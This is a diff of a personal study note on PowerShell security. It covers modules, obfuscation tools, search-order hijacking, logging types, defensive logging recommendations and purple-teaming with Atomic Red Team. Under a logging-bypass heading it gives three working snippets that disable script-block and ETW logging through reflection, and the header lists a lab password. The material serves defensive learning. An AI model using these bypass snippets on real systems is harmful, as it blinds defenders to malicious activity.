@@ -3,7 +3,7 @@ aliases:
 tags: 
 publish: true
 date created: Wednesday, November 6th 2024, 8:00 am
-date modified: Wednesday, November 6th 2024, 11:51 am
+date modified: Wednesday, November 6th 2024, 2:45 pm
 ---
 
 - IEUser: Passw0rd!
@@ -210,9 +210,157 @@ date modified: Wednesday, November 6th 2024, 11:51 am
 	- `$profile` - current profile
 - More basic commands
 
-# 
+# Modules & Scripts
 
-- .
+- Module benefits
+	- Have version control advantages
+	- Scope/visibility control
+	- Easy to update and share
+	- Consolidation
+- Modules scale better
+- PowerShell Gallery
+	- You can have your own private gallery as well for your small-medium-sized company
+- `Install-Script -Namem Install-VSCode`
+	- Easier than finding the download in the browser
+
+## Module Types
+
+- PSM 
+	- PowerShell module
+- PSD
+	- PowerShell Data File
+- Script Module + Module Manifest
+	- PSM1 + PSD1
+- Binary Modules
+	- .NET dll
+- Dynamic Modules
+	- in memory only
+
+## Script Module - File Extension
+
+- Ps1 - script
+- Psm1 - script module
+- Some cmdlets and functions can run from psm1 that can't from scripts or CLI
+
+## Import-Module & Dot Sourcing
+
+- Don't use dot sourcing..use `Import-Module`
+
+## Name Conflicts
+
+- Alias, Fucntion, Cmdlet, Application
+
+## Releasing your own module
+
+- You'll make a data psd and psm1 file with the psd file referencing the psm1 file with "RootSource"
+
+# Obfuscation
+
+- `Invoke-Obfuscation` - obfuscate commands and bypass signature-based detection
+- `Revoke-Obfuscation` - determine likelihood of obfuscation of a script
+
+# Search/Run Order Hijacking
+
+- `Get-Variable` hijack
+- A function or script needs to run, so the malware makes an executable named `Get-Variable` and PowerShell has to look for `Get-Variable` the other ones were deleted or affected so, at some point, PS is used and the malware is ran
+- A powershell module that is well-known should not somehow be running from a user's Temp directory
+
+# Integrated Development Environments (IDE)
+
+- Powershell ISE (integrated scripting environment)
+- Use VS Code with the PowerShell plugin.  
+- Debugging works great for larger complex scripts
+
+# Logging & Logging Bypasses
+
+- Script Block Logging came in v4
+- Module and transcription logging came in v5
+- JEA (Just enough administration) came in v5
+
+- PowerShell logging is set up separately from all other Microsoft logging
+
+- One bypass is to run older PowerShell versions (these older versions should be blocked)
+
+## Default Logging
+
+- Really doesn't show much at all except suspicious events like those using `Add-Type`
+- Also pipeline lifecycle stuff
+- Suspicious terms:
+	- Microsoft has a big list
+	- The big ones are add-type, GetField, and NonPublic
+	- It's literal string matching
+
+## Script Block Logging
+
+- PowerShell Operational Log - the source
+- Logs processing of commands, script bloacks, functions, and scripts (interactive or automated)
+- Event ID 4104 (optional start/stop logging 4105/4106)
+- HKLM...EnableScriptblockLogging
+	- Enable in Group Policy
+
+## Module Logging
+
+- More logs
+
+## Transaction Logging
+
+- More logs
+
+## Transcription Logging
+
+- Over-the-shoulder logging
+- You will just see what they see in the window and not what's running in the background
+
+## Protected Event Logging
+
+- Introduced in Windows 10
+- Allows application to encrypt sensitive data written to logs
+- Sysadmins sometimes put sensitive data in logs, so this is a way of mitigating the risks from that
+
+## Script Block & Module Logging Bypass
+
+- https://github.com/cobbr/cobbr.io/blob/master/_posts/2017-05-02-ScriptBlock-Warning-Event-Logging-Bypass.md
+
+```powershell
+[ScriptBlock].GetField('signatures','NonPublic,Static').GetValue($null)
+
+[ScriptBlock]."GetFiel`d"('signatures','N'+'onPublic,Static').SetValue($null,(New-Object Collections.Generic.HashSet[string]))
+```
+
+```powershell
+([ref].Assembly.definedTypes | ? Name -like "PSEtwLogProvider")."GetFie`ld"('etwProvider','Non'+'Public,Static').getValue($null).dispose()
+```
+
+ETW = Event Tracing for Windows
+Transcripts still show, but not that helpful
+
+https://connect.ed-diamond.com/MISC/misc-104/evolution-de-la-securite-de-powershell-et-techniques-de-contournement
+
+```powershell
+$EtwProvider = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static');
+$EventProvider = New-Object System.Diagnostics.Eventing.EventProvider -ArgumentList @([Guid]::NewGuid());
+$EtwProvider.SetValue($null, $EventProvider);
+```
+
+## Logging Recommendations
+
+- Deploy the latest version of PowerShell (v5.1+)
+- Enable, and collect PowerShell logs, optionally including Protected Event Logging. Incorporate these logs into your signatures, hunting, and incident response workflows.
+- Implement Just Enough Administration on high-value systems to eliminate or reduce unconstrained administrative access to those systems.
+- Deploy Windows Defender Application Control policies to allow pre-approved administrative tasks to use the full capability of the PowerShell language, while limiting interactive and unapproved use to a limited subset of the PowerShell language.
+- Deploy Windows 10 or later to give your antivirus provider full access to all content (including content generated or de-obfuscated at runtime) processed by Windows Scripting Hosts including PowerShell.
+- Increase Log sizes (Mandiant recommends 1GB+)
+
+# Tools for Emulation or Purple Teaming with PowerShell - Assessing PS Risks
+
+Other comprehensive methods for testing detections when it comes to PowerShell - especially in collaboration with teams on the frontlines of security operations?
+
+Maybe we want to systematically go through utilities or interfaces like PowerShell to see if we are logging enough from them for detections.  Are tools like AtomicRedTeam good for doing that.  We just don't want to have to research the attacks ourselves and it may be hard to keep up with as a small team. 
+- This would help teams figure out  exactly what they need to log and help them automate detection from those logs.
+
+- [redcanaryco/atomic-red-team: Small and highly portable detection tests based on MITRE's ATT&CK.](https://github.com/redcanaryco/atomic-red-team) 
+	- Great tool for testing out detections from PowerShell
+	- Essentially unit tests you can go and run to see if you're logging enough or detecting the attacks
 
 # Questions
 
@@ -220,7 +368,18 @@ date modified: Wednesday, November 6th 2024, 11:51 am
 - What object types are there?  Are there custom ones with parameters? Does PS store anything about the objects in the background
 - Does EDR or SIEM look for editing of these history files?  
 	- Looking for editing of "HistorySaveStyle" and other parameters can be interesting behavior to look for
-- 
+
+# Action Items
+
+- Where does your team get their baseline/default configuration for Microsoft logging and settings
+- How does your team do desktop/endpoint/workstation provisioning
+- Do you have PowerShell logging turned on
+- What does your EDR and SIEM rules/detections cover?
+- JIT and JEA?
+- Purple teaming and emulation for detections?
+- How do we figure out who can have/needs PowerShell in the org?  Do we have UEBA (user behavior analytics) - alerting on users trying to run PS who never do?
+- Why aren't we trying out AtomicRedTeam
+- Why don't teams hire at least one internal pentester that can internally "purple team?"
 
 # Resources
 
